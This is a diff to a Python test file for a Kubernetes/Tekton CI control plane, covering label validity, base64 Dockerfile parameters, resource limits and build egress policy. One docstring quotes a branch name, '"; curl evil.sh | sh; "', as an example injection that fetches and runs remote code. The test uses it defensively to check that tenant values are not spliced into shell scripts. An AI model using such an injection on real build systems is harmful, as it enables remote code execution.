@@ -326,7 +326,10 @@ def test_stage_names_are_sanitised_but_the_tenants_wording_is_kept():
 
     assert task["name"] == tekton.stage_task_name(1, "Unit Tests & Lint!")
     assert task["name"].replace("-", "").isalnum()
-    assert task["taskSpec"]["metadata"]["labels"]["controlplane.io/stage-name"] == "Unit Tests & Lint!"
+    # An annotation: label values must be DNS-safe, and "Unit Tests & Lint!"
+    # is not — Kubernetes rejects the TaskRun and the pipeline dies at the
+    # first stage with an error about label syntax.
+    assert task["taskSpec"]["metadata"]["annotations"]["controlplane.io/stage-name"] == "Unit Tests & Lint!"
 
 
 def test_two_stages_with_the_same_name_do_not_collide():
@@ -351,15 +354,47 @@ def test_a_stage_without_an_image_falls_back_to_the_sandbox_image():
     assert spec["tasks"][1]["taskSpec"]["steps"][0]["image"] == "sandbox:latest"
 
 
-def test_generated_dockerfile_travels_as_a_parameter():
+def test_generated_dockerfile_travels_as_a_base64_parameter():
     """Under Tekton the checkout only exists in the cluster, so a Dockerfile
-    written on the control-plane host would never reach kaniko."""
+    written on the control-plane host would never reach kaniko. Base64 because
+    Tekton splices params textually into the task's shell script, and a
+    Dockerfile's own quotes and newlines do not survive that — kaniko then
+    fails with "arrays must be comprised of strings only", which names neither
+    the cause nor the file."""
+    import base64
+
+    body = 'FROM alpine:3.20\nCMD ["true"]\n'
     obj = tekton.render_pipelinerun(
-        uuid.uuid4(), uuid.uuid4(), "u", "main", "img", "sa", dockerfile="FROM python:3.12\n",
+        uuid.uuid4(), uuid.uuid4(), "u", "main", "img", "sa", dockerfile=body,
     )
     params = {p["name"]: p["value"] for p in obj["spec"]["params"]}
 
-    assert params["dockerfile"] == "FROM python:3.12\n"
+    assert base64.b64decode(params["dockerfile-b64"]).decode() == body
+    # Nothing that could end a shell string or start a command.
+    assert not set(params["dockerfile-b64"]) & set("\"'`$\\ \n;|&")
+
+
+def test_tenant_supplied_values_are_not_spliced_into_the_task_script():
+    """Tekton substitutes $(params.x) textually. A branch named
+    `"; curl evil.sh | sh; "` pasted into the clone script would execute, and
+    the branch is tenant-supplied. Reading params from the environment makes
+    the shell treat them as data."""
+    import pathlib
+
+    import yaml
+
+    root = pathlib.Path(__file__).resolve().parents[2]
+    docs = [d for d in yaml.safe_load_all((root / "k8s/tekton/pipeline.yaml").read_text()) if d]
+    clone = next(d for d in docs if d["kind"] == "Task" and d["metadata"]["name"] == "clone")
+    step = clone["spec"]["steps"][0]
+
+    assert "$(params.revision)" not in step["script"]
+    assert "$(params.repo-url)" not in step["script"]
+    assert "$(params.dockerfile-b64)" not in step["script"]
+
+    env = {e["name"]: e["value"] for e in step["env"]}
+    assert env["REVISION"] == "$(params.revision)"
+    assert env["REPO_URL"] == "$(params.repo-url)"
 
 
 def test_clone_task_never_overwrites_a_repositorys_own_dockerfile():
@@ -385,3 +420,105 @@ def test_declared_task_list_includes_tenant_stages():
     assert tekton.pipeline_task_names(stages) == [
         "clone", tekton.stage_task_name(1, "unit tests"), "build", "scan",
     ]
+
+
+def test_no_label_value_can_carry_free_text():
+    """Regression: a stage named "unit tests" put a space into a label value,
+    and Kubernetes refused to create the TaskRun at all. Free text belongs in
+    an annotation; every label value here must satisfy the DNS-safe rule
+    Kubernetes enforces."""
+    import re
+
+    label_value = re.compile(r"^(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?$")
+    spec = tekton.build_pipeline_spec(
+        [_Stage("unit tests"), _Stage("lint & check"), _Stage("A" * 80)], "sandbox:latest"
+    )
+
+    for task in spec["tasks"]:
+        for key, value in (task.get("taskSpec", {}).get("metadata", {}).get("labels", {})).items():
+            assert label_value.match(value), f"{key}={value!r} is not a valid label value"
+        assert len(task["name"]) <= 63
+
+
+def test_pipelinerun_labels_are_valid_too():
+    import re
+
+    label_value = re.compile(r"^(([A-Za-z0-9][-A-Za-z0-9_.]*)?[A-Za-z0-9])?$")
+    obj = tekton.render_pipelinerun(uuid.uuid4(), uuid.uuid4(), "u", "main", "i", "sa")
+
+    for key, value in obj["metadata"]["labels"].items():
+        assert label_value.match(value), f"{key}={value!r} is not a valid label value"
+
+
+def test_stage_steps_declare_their_own_modest_resources():
+    """Without these the namespace LimitRange default applies — 500m of limit
+    per step — and a tenant whose app already uses most of its quota cannot run
+    a stage at all: the pod is refused with "exceeded quota" before the stage's
+    command is reached."""
+    spec = tekton.build_pipeline_spec([_Stage("unit tests")], "sandbox:latest")
+    resources = spec["tasks"][1]["taskSpec"]["steps"][0]["computeResources"]
+
+    assert resources["requests"]["cpu"] == "50m"
+    assert resources["limits"]["cpu"] == "250m"
+
+
+def test_tekton_pushes_to_the_in_cluster_registry_address():
+    """A build pod resolving `localhost` reaches itself, so kaniko fails the
+    push-permission check against its own loopback. The sandbox path never hit
+    this because it pushes from the host, where that address is correct."""
+    from controlplane.tests.conftest import override_settings
+    from controlplane.workers.tasks import _registry_scan_ref
+
+    with override_settings(registry="localhost:5000", registry_internal="kind-registry:5000"):
+        assert _registry_scan_ref("localhost:5000/team/app:commit-abc") == "kind-registry:5000/team/app:commit-abc"
+
+
+def _spec():
+    from controlplane.schemas.spec import InfraSpec
+
+    return InfraSpec.model_validate(
+        {
+            "project": "demo",
+            "mode": "namespace",
+            "network": {"cidr": "192.168.56.0/24", "domain": "devops.local"},
+            "nodes": [
+                {"name": "n1", "vcpu": 2, "memory_mb": 4096, "disk_gb": 20, "role": "k8s_master"}
+            ],
+        }
+    )
+
+
+def test_build_egress_policy_is_absent_unless_tekton_and_a_registry_cidr_are_set():
+    """Opening a hole in the tenant default-deny egress must be a deliberate
+    configuration, not something that appears because Tekton got installed."""
+    from controlplane.renderers.namespace import build_manifests
+    from controlplane.tests.conftest import override_settings
+
+    with override_settings(tekton_enabled=False, registry_cidr="172.18.0.0/16"):
+        kinds = [(m["kind"], m["metadata"]["name"]) for m in build_manifests(_spec(), "p-abc")]
+        assert not any("allow-build-registry" in name for _, name in kinds)
+
+    with override_settings(tekton_enabled=True, registry_cidr=""):
+        kinds = [(m["kind"], m["metadata"]["name"]) for m in build_manifests(_spec(), "p-abc")]
+        assert not any("allow-build-registry" in name for _, name in kinds)
+
+
+def test_build_egress_policy_selects_only_build_pods_and_only_the_registry():
+    """A tenant's application pods must keep the unmodified default-deny
+    egress: this rule exists for the push, not as a general exemption."""
+    from controlplane.renderers.namespace import build_manifests
+    from controlplane.tests.conftest import override_settings
+
+    with override_settings(
+        tekton_enabled=True, registry_cidr="172.18.0.2/32", registry_internal="kind-registry:5000"
+    ):
+        policy = next(
+            m for m in build_manifests(_spec(), "p-abc")
+            if m["kind"] == "NetworkPolicy" and "allow-build-registry" in m["metadata"]["name"]
+        )
+
+    assert policy["spec"]["policyTypes"] == ["Egress"]
+    assert policy["spec"]["podSelector"]["matchExpressions"][0]["key"] == "tekton.dev/pipelineRun"
+    egress = policy["spec"]["egress"][0]
+    assert egress["to"][0]["ipBlock"]["cidr"] == "172.18.0.2/32"
+    assert egress["ports"] == [{"protocol": "TCP", "port": 5000}]
